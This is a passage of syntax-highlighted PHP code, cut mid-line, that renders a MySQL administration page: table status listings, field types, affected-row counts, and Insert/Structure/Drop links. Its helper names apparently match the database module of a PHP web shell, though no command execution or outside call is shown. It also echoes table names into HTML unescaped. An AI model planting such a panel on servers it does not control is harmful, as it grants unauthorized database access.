style="text-decoration: underline;">);</span>

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">b1</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">unset(</span>$<span style="color: #ffcc66;">b1</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">allowedit</span>) <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fieldnum</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_num_fields(</span>$<span style="color: #ffcc66;">result</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;$<span style="color: #ffcc66;">i</span>&lt;$<span style="color: #ffcc66;">fieldnum</span>;$<span style="color: #ffcc66;">i</span>++){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">name</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_name(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">type</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_type(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">len</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_len(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #66cccc; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">tbfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">multipage</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">break</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">case</span> <span style="color: #6699cc;">2</span>:
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">ar</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_affected_rows(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #ffcc66;">ar</span>.<span style="color: #66cccc;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">break</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">query</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">table_num</span> = $<span style="color: #ffcc66;">table_rows</span> = $<span style="color: #ffcc66;">data_size</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">table</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">query</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">data_size</span> = $<span style="color: #ffcc66;">data_size</span> + $<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Data_length'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">table_rows</span> = $<span style="color: #ffcc66;">table_rows</span> + $<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Rows'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Data_length'</span>] = <span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Data_length'</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">table_num</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledb</span>[] = $<span style="color: #ffcc66;">table</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">data_size</span> = <span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>$<span style="color: #ffcc66;">data_size</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">unset(</span>$<span style="color: #ffcc66;">table</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="POST"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">highver</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">tabledb</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =&gt; $<span style="color: #ffcc66;">table</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\'foc</span><span style="color: #66cccc; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #66cccc; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Name'</span>].<span style="color: #66cccc;">'\');</span><span style="color: #66cccc; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Rows'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Data_length'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Create_time'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Update_time'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">highver</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Engine'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Collation'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffcc66;">table</span>[<span style="color: #66cccc;">'Name'</span>].<span style="color: #66cccc;">'\', </span><span style="color: #66cccc; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #66cccc; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
